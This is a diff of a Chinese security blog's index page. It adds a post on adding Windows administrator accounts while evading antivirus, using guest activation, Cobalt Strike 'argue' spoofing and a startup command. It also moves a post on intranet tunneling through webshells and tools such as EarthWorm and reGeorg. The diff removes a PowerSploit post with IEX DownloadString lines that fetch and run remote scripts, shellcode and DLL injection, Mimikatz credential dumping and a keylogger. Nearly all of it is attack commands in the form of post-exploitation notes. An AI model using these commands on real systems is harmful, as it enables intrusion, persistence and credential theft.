@@ -261,7 +261,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/11/12/多级内网穿透/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/12/02/Win绕过AV添加账号/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="scareing">
@@ -280,7 +280,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/11/12/多级内网穿透/" itemprop="url">未命名</a></h1>
+                <a class="post-title-link" href="/2019/12/02/Win绕过AV添加账号/" itemprop="url">Win绕过AV添加账号</a></h1>
         
 
         <div class="post-meta">
@@ -292,8 +292,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-12T18:08:14+08:00">
-                2019-11-12
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-02T00:00:01+08:00">
+                2019-12-02
               </time>
             
 
@@ -302,6 +302,28 @@
             
           </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/bypass/" itemprop="url" rel="index">
+                    <span itemprop="name">bypass</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -332,38 +354,28 @@
       
         
           
-            <h1 id="多级内网穿透"><a href="#多级内网穿透" class="headerlink" title="多级内网穿透"></a>多级内网穿透</h1><h2 id="SOCK通道：ew"><a href="#SOCK通道：ew" class="headerlink" title="SOCK通道：ew"></a>SOCK通道：ew</h2><p>项目地址： <a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a> </p>
+            <h1 id="Win绕过AV添加账号"><a href="#Win绕过AV添加账号" class="headerlink" title="Win绕过AV添加账号"></a>Win绕过AV添加账号</h1><ul>
+<li>开启来宾用户</li>
+</ul>
 <blockquote>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> EarthWorm是一种用于开启SOCKS v5代理服务的工具，基于标准C开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+<p>net user guest /active:yes</p>
+<p>net user localgroup “Remote Desktop User” guest /add </p>
+<p>由于无法直接添加管理员组，所以为了远程连接，添加到远程连接组</p>
 </blockquote>
-<p>通过本地设置sock代理进行流量转发。</p>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">* 将本机量转发到本地<span class="number">1090</span>。</span><br><span class="line">ew_for_Win.exe -s lcx_listen -l <span class="number">1090</span> -e <span class="number">1080</span></span><br><span class="line">* 将<span class="number">1090</span>收到的流量转发到本地的<span class="number">1080</span></span><br><span class="line">ew_for_Win.exe -s lcx_listen -l <span class="number">1090</span> -e <span class="number">1080</span></span><br><span class="line">* 把<span class="number">1090</span>端口收到的流量转发到，<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>的<span class="number">1080</span>端口</span><br><span class="line">ew_for_Win.exe -s lcx_tran -l <span class="number">1090</span> -f <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> -g <span class="number">1080</span> </span><br><span class="line">* 对<span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span>的<span class="number">1080</span>端口与<span class="number">1090</span>端口间的流量从本机进行转发</span><br><span class="line">ew_for_Win.exe -s lcx_slave -d <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span> -e <span class="number">1080</span> -f <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> -g <span class="number">1090</span></span><br><span class="line">* 把内网主机反向代理到公网主机的<span class="number">1024</span>端口。</span><br><span class="line">ew_for_Win.exe -s rssocks -d <span class="number">10.</span>xxx.xxx.xx -e <span class="number">1024</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="HTTP隧道：-abptts"><a href="#HTTP隧道：-abptts" class="headerlink" title="HTTP隧道： abptts"></a>HTTP隧道： abptts</h2><p>项目地址： <a href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a> </p>
+<ul>
+<li>CS的argue命令参数污染。</li>
+</ul>
 <blockquote>
-<p>ABPTTS使用Python客户端脚本和Web应用程序服务器页面，通过HTTP/HTTPS连接将TCP通信通过隧道传输到Web应用程序服务器。换句话说，在任何可以部署Web Shell的地方，都能够建立完整的TCP隧道。这允许通过Web应用程序服务器建立RDP，交互式SSH，Meterpreter和其他连接。这些通信设计是与HTTP标准完全兼容的，这意味着除了隧道<em>在</em>通过目标Web应用程序服务器，它可以被用来建立一个<em>出站</em>通过分组检查防火墙连接。</p>
+<p>argue net1 xxxxx</p>
+<p>execute net1 user test /add</p>
+<p>execute net1 localgroup administrators test /add</p>
 </blockquote>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> abpttsfactory.<span class="keyword">py</span> -<span class="keyword">o</span> webshell</span><br><span class="line">* 将目标的<span class="number">3389</span>端口转发到本地<span class="number">1024</span>端口</span><br><span class="line"><span class="keyword">python</span> abpttsclient.<span class="keyword">py</span> -<span class="keyword">c</span> config.txt -<span class="keyword">u</span> <span class="string">"http://********/abptts.aspx"</span> -<span class="keyword">f</span> <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">1024</span>/********:<span class="number">3389</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="HTTP隧道：reGeorg"><a href="#HTTP隧道：reGeorg" class="headerlink" title="HTTP隧道：reGeorg"></a>HTTP隧道：reGeorg</h2><p>项目地址：<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p>
+<ul>
+<li>添加优先级高于AV的启动项</li>
+</ul>
 <blockquote>
-<p> reDuh的后继者，堡垒网络服务器，并通过DMZ创建SOCKS代理。只要将JSP/PHP/ASP/ASPX等页面上传到目标服务器，便可以访问该服务器后面的主机。可惜的是，大部分waf都会针对默认的reGeorg。  </p>
+<p>C:/windows/system32/cmd.exe /c net user test /add;net localgroup administrators test /add</p>
 </blockquote>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 将目标流量转发到本机的<span class="number">8080</span>端口，本机为<span class="number">192.168</span><span class="meta">.1</span><span class="meta">.1</span></span><br><span class="line">python reGeorgSocksProxy.py ‐p <span class="number">8080</span> ‐l <span class="number">192.168</span><span class="meta">.1</span><span class="meta">.1</span> ‐u http://********/tunnel.aspx</span><br></pre></td></tr></table></figure>
-
-<h2 id="HTTP隧道：Tunna"><a href="#HTTP隧道：Tunna" class="headerlink" title="HTTP隧道：Tunna"></a>HTTP隧道：Tunna</h2><p>项目地址： <a href="https://github.com/SECFORCE/Tunna">https://github.com/SECFORCE/Tunna</a> </p>
-<blockquote>
-<p>此webshell可用于连接到远程主机上的任何服务。这将是远程主机上本地端口上的本地连接，并且被防火墙允许。webshell从服务端口读取数据，并通过HTTP封装它们，并将其作为HTTP响应发送到本地代理。本地代理将解包并将数据写入客户端程序将要连接到的本地端口。当本地代理在本地端口上接收数据时，它将作为HTTP Post发送到Webshell。该Webshell将从HTTP Post中读取数据并将其放在服务端口上，并重复转发，整个通信（外部）是通过HTTP协议完成的。</p>
-</blockquote>
-<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">* 将远程主机3389端口转发到本地1024端口。</span></span><br><span class="line">python proxy.py ‐u http:<span class="comment">//192.168.1.1/Tunna.aspx ‐l 1024 ‐r 3389 ‐s ‐v</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="ICMP隧道：ptunnel-ng"><a href="#ICMP隧道：ptunnel-ng" class="headerlink" title="ICMP隧道：ptunnel-ng"></a>ICMP隧道：ptunnel-ng</h2><p>项目地址： <a href="https://github.com/lnslbrty/ptunnel-ng">https://github.com/lnslbrty/ptunnel-ng</a> </p>
-<blockquote>
-<p> 在禁止udp/tcp通信的时候，可以利用icmp隧道进行穿透 那些禁止udp/tcp端口通信的环境。</p>
-</blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">./ptunnel-ng -r<span class="tag">&lt;<span class="name">destination</span> <span class="attr">address</span>&gt;</span> -R<span class="tag">&lt;<span class="name">destination</span> <span class="attr">port</span>&gt;</span> -v <span class="tag">&lt;<span class="name">loglevel</span>&gt;</span> -P<span class="tag">&lt;<span class="name">password</span>&gt;</span> -u<span class="tag">&lt;<span class="name">user</span>&gt;</span> -g<span class="tag">&lt;<span class="name">group</span>&gt;</span></span><br><span class="line"></span><br><span class="line">./ptunnel-ng -p <span class="tag">&lt;<span class="name">address</span>&gt;</span> -l <span class="tag">&lt;<span class="name">listen</span> <span class="attr">port</span>&gt;</span> -r<span class="tag">&lt;<span class="name">destination</span> <span class="attr">address</span>&gt;</span> -R<span class="tag">&lt;<span class="name">destination</span> <span class="attr">port</span>&gt;</span> -v <span class="tag">&lt;<span class="name">loglevel</span>&gt;</span> -P<span class="tag">&lt;<span class="name">password</span>&gt;</span> -u<span class="tag">&lt;<span class="name">user</span>&gt;</span> -g<span class="tag">&lt;<span class="name">group</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>未完待续。。。。。</p>
 
           
         
@@ -907,6 +919,182 @@
 <p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/15/Everything%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/1.jpg" alt="avatar"></p>
 </li>
 </ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+    <div>
+          
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/10/15/多级内网穿透/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/10/15/多级内网穿透/" itemprop="url">多级内网穿透</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-15T00:00:01+08:00">
+                2019-10-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/内网/" itemprop="url" rel="index">
+                    <span itemprop="name">内网</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="多级内网穿透"><a href="#多级内网穿透" class="headerlink" title="多级内网穿透"></a>多级内网穿透</h1><h2 id="SOCK通道：ew"><a href="#SOCK通道：ew" class="headerlink" title="SOCK通道：ew"></a>SOCK通道：ew</h2><p>项目地址： <a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a> </p>
+<blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> EarthWorm是一种用于开启SOCKS v5代理服务的工具，基于标准C开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>通过本地设置sock代理进行流量转发。</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">* 将本机<span class="number">1090</span>转发到本地<span class="number">1080</span>。</span><br><span class="line">ew_for_Win.exe -s lcx_listen -l <span class="number">1090</span> -e <span class="number">1080</span></span><br><span class="line">* 将<span class="number">1090</span>收到的流量转发到本地的<span class="number">1080</span></span><br><span class="line">ew_for_Win.exe -s lcx_listen -l <span class="number">1090</span> -e <span class="number">1080</span></span><br><span class="line">* 把<span class="number">1090</span>端口收到的流量转发到，<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>的<span class="number">1080</span>端口</span><br><span class="line">ew_for_Win.exe -s lcx_tran -l <span class="number">1090</span> -f <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> -g <span class="number">1080</span> </span><br><span class="line">* 对<span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span>的<span class="number">1080</span>端口与<span class="number">1090</span>端口间的流量从本机进行转发</span><br><span class="line">ew_for_Win.exe -s lcx_slave -d <span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span> -e <span class="number">1080</span> -f <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> -g <span class="number">1090</span></span><br><span class="line">* 把内网主机反向代理到公网主机的<span class="number">1024</span>端口。</span><br><span class="line">ew_for_Win.exe -s rssocks -d <span class="number">10.</span>xxx.xxx.xx -e <span class="number">1024</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="HTTP隧道：-abptts"><a href="#HTTP隧道：-abptts" class="headerlink" title="HTTP隧道： abptts"></a>HTTP隧道： abptts</h2><p>项目地址： <a href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a> </p>
+<blockquote>
+<p>ABPTTS使用Python客户端脚本和Web应用程序服务器页面，通过HTTP/HTTPS连接将TCP通信通过隧道传输到Web应用程序服务器。换句话说，在任何可以部署Web Shell的地方，都能够建立完整的TCP隧道。这允许通过Web应用程序服务器建立RDP，交互式SSH，Meterpreter和其他连接。这些通信设计是与HTTP标准完全兼容的，这意味着除了隧道<em>在</em>通过目标Web应用程序服务器，它可以被用来建立一个<em>出站</em>通过分组检查防火墙连接。</p>
+</blockquote>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> abpttsfactory.<span class="keyword">py</span> -<span class="keyword">o</span> webshell</span><br><span class="line">* 将目标的<span class="number">3389</span>端口转发到本地<span class="number">1024</span>端口</span><br><span class="line"><span class="keyword">python</span> abpttsclient.<span class="keyword">py</span> -<span class="keyword">c</span> config.txt -<span class="keyword">u</span> <span class="string">"http://********/abptts.aspx"</span> -<span class="keyword">f</span> <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">1024</span>/********:<span class="number">3389</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="HTTP隧道：reGeorg"><a href="#HTTP隧道：reGeorg" class="headerlink" title="HTTP隧道：reGeorg"></a>HTTP隧道：reGeorg</h2><p>项目地址：<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p>
+<blockquote>
+<p> reDuh的后继者，堡垒网络服务器，并通过DMZ创建SOCKS代理。只要将JSP/PHP/ASP/ASPX等页面上传到目标服务器，便可以访问该服务器后面的主机。可惜的是，大部分waf都会针对默认的reGeorg。  </p>
+</blockquote>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 将目标流量转发到本机的<span class="number">8080</span>端口，本机为<span class="number">192.168</span><span class="meta">.1</span><span class="meta">.1</span></span><br><span class="line">python reGeorgSocksProxy.py ‐p <span class="number">8080</span> ‐l <span class="number">192.168</span><span class="meta">.1</span><span class="meta">.1</span> ‐u http://********/tunnel.aspx</span><br></pre></td></tr></table></figure>
+
+<h2 id="HTTP隧道：Tunna"><a href="#HTTP隧道：Tunna" class="headerlink" title="HTTP隧道：Tunna"></a>HTTP隧道：Tunna</h2><p>项目地址： <a href="https://github.com/SECFORCE/Tunna">https://github.com/SECFORCE/Tunna</a> </p>
+<blockquote>
+<p>此webshell可用于连接到远程主机上的任何服务。这将是远程主机上本地端口上的本地连接，并且被防火墙允许。webshell从服务端口读取数据，并通过HTTP封装它们，并将其作为HTTP响应发送到本地代理。本地代理将解包并将数据写入客户端程序将要连接到的本地端口。当本地代理在本地端口上接收数据时，它将作为HTTP Post发送到Webshell。该Webshell将从HTTP Post中读取数据并将其放在服务端口上，并重复转发，整个通信（外部）是通过HTTP协议完成的。</p>
+</blockquote>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">* 将远程主机3389端口转发到本地1024端口。</span></span><br><span class="line">python proxy.py ‐u http:<span class="comment">//192.168.1.1/Tunna.aspx ‐l 1024 ‐r 3389 ‐s ‐v</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="ICMP隧道：ptunnel-ng"><a href="#ICMP隧道：ptunnel-ng" class="headerlink" title="ICMP隧道：ptunnel-ng"></a>ICMP隧道：ptunnel-ng</h2><p>项目地址： <a href="https://github.com/lnslbrty/ptunnel-ng">https://github.com/lnslbrty/ptunnel-ng</a> </p>
+<blockquote>
+<p> 在禁止udp/tcp通信的时候，可以利用icmp隧道进行穿透 那些禁止udp/tcp端口通信的环境。</p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">./ptunnel-ng -r<span class="tag">&lt;<span class="name">destination</span> <span class="attr">address</span>&gt;</span> -R<span class="tag">&lt;<span class="name">destination</span> <span class="attr">port</span>&gt;</span> -v <span class="tag">&lt;<span class="name">loglevel</span>&gt;</span> -P<span class="tag">&lt;<span class="name">password</span>&gt;</span> -u<span class="tag">&lt;<span class="name">user</span>&gt;</span> -g<span class="tag">&lt;<span class="name">group</span>&gt;</span></span><br><span class="line"></span><br><span class="line">./ptunnel-ng -p <span class="tag">&lt;<span class="name">address</span>&gt;</span> -l <span class="tag">&lt;<span class="name">listen</span> <span class="attr">port</span>&gt;</span> -r<span class="tag">&lt;<span class="name">destination</span> <span class="attr">address</span>&gt;</span> -R<span class="tag">&lt;<span class="name">destination</span> <span class="attr">port</span>&gt;</span> -v <span class="tag">&lt;<span class="name">loglevel</span>&gt;</span> -P<span class="tag">&lt;<span class="name">password</span>&gt;</span> -u<span class="tag">&lt;<span class="name">user</span>&gt;</span> -g<span class="tag">&lt;<span class="name">group</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>未完待续。。。。。</p>
 
           
         
@@ -2709,211 +2897,6 @@ PasswordAuthentication yes
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/PowerSploit基本功能演示/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="scareing">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/Bloglogo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scareing的学习笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/26/PowerSploit基本功能演示/" itemprop="url">PowerSploit基本功能演示</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
-                2019-08-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Powershell/" itemprop="url" rel="index">
-                    <span itemprop="name">Powershell</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="PowerSploit基本功能演示"><a href="#PowerSploit基本功能演示" class="headerlink" title="PowerSploit基本功能演示"></a>PowerSploit基本功能演示</h1><h2 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h2><ul>
-<li><p>AntivirusBypass     //发现杀软查杀特征</p>
-</li>
-<li><p>CodeExecution      //代码执行</p>
-</li>
-<li><p>Exfiltration     //信息收集</p>
-</li>
-<li><p>Mayhem    //破坏性脚本</p>
-</li>
-<li><p>Persistence    //后门</p>
-</li>
-<li><p>Recon     //利用跳板进行内网信息侦擦</p>
-</li>
-<li><p>ScriptModification     //创建或修改脚本</p>
-<h2 id="利用演示"><a href="#利用演示" class="headerlink" title="利用演示"></a>利用演示</h2><h3 id="CodeExecution"><a href="#CodeExecution" class="headerlink" title="CodeExecution"></a>CodeExecution</h3></li>
-<li><ul>
-<li>Invoke-Shellcode.ps1 **</li>
-</ul>
-<p>shellcode注入</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/CodeExecution/Invoke-Shellcode.ps1&quot;)
-//下载并导入脚本
-IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/test&quot;)
-//下载powershell的shellcode
-Invoke-Shellcode -Shellcode ($buf) -Force
-//注入下载的shellcode并运行，-force是为了强制执行，用于消除提示。$用于指定变量，buf为test中的数组，数组中包含shellcode。
-Start-Process c:\windows\system32\notepad.exe -Windowstyle Hidden
-//隐藏的开始一个记事本进程。
-Invoke-Shellcode  -ProcessID 10836  -Shellcode ($buf) -Force
-//将shellcode注入到刚刚开始的记事本进程中。</code></pre></li>
-<li><ul>
-<li>Invoke-DllInjection.ps1 **</li>
-</ul>
-<p>dll注入</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/CodeExecution/Invoke-DllInjection.ps1&quot;)
-//下载并导入脚本
-Invoke-DllInjection  -ProcessID 10836  -Dll c:\test.dll
-//注入dll到指定进程</code></pre><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3></li>
-<li><ul>
-<li>Invoke-Portscan **</li>
-</ul>
-<p>端口扫描</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Recon/Invoke-Portscan.ps1&quot;)
-//下载并导入脚本
-Invoke-Portscan -Hosts 172.22.35.0,172.22.35.255 -Ports &quot;80,445,3389&quot;
-//扫描指定地址及指定端口</code></pre><h3 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h3></li>
-<li><ul>
-<li>Invoke-Mimikatz.ps1 **</li>
-</ul>
-<p>密码抓取，实际上就是Mimikatz的PowerShell版本</p>
-<pre><code> IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Exfiltration/Invoke-Mimikatz.ps1&quot;)
- //下载并导入脚本
- Invoke-Mimikatz -DumpCreds
- //抓取密码
-
-** Get-Keystrokes.ps1 **</code></pre><p>键盘记录及鼠标点击记录</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Exfiltration/Get-Keystrokes.ps1&quot;)
-//下载并导入脚本
-Get-Keystrokes -LogPath c:\test.txt
-//开启记录并保存到指定位置</code></pre></li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/03/PowerSploit%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-    <div>
-          
-    </div>
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2966,7 +2949,7 @@ Get-Keystrokes -LogPath c:\test.txt
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2977,7 +2960,7 @@ Get-Keystrokes -LogPath c:\test.txt
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
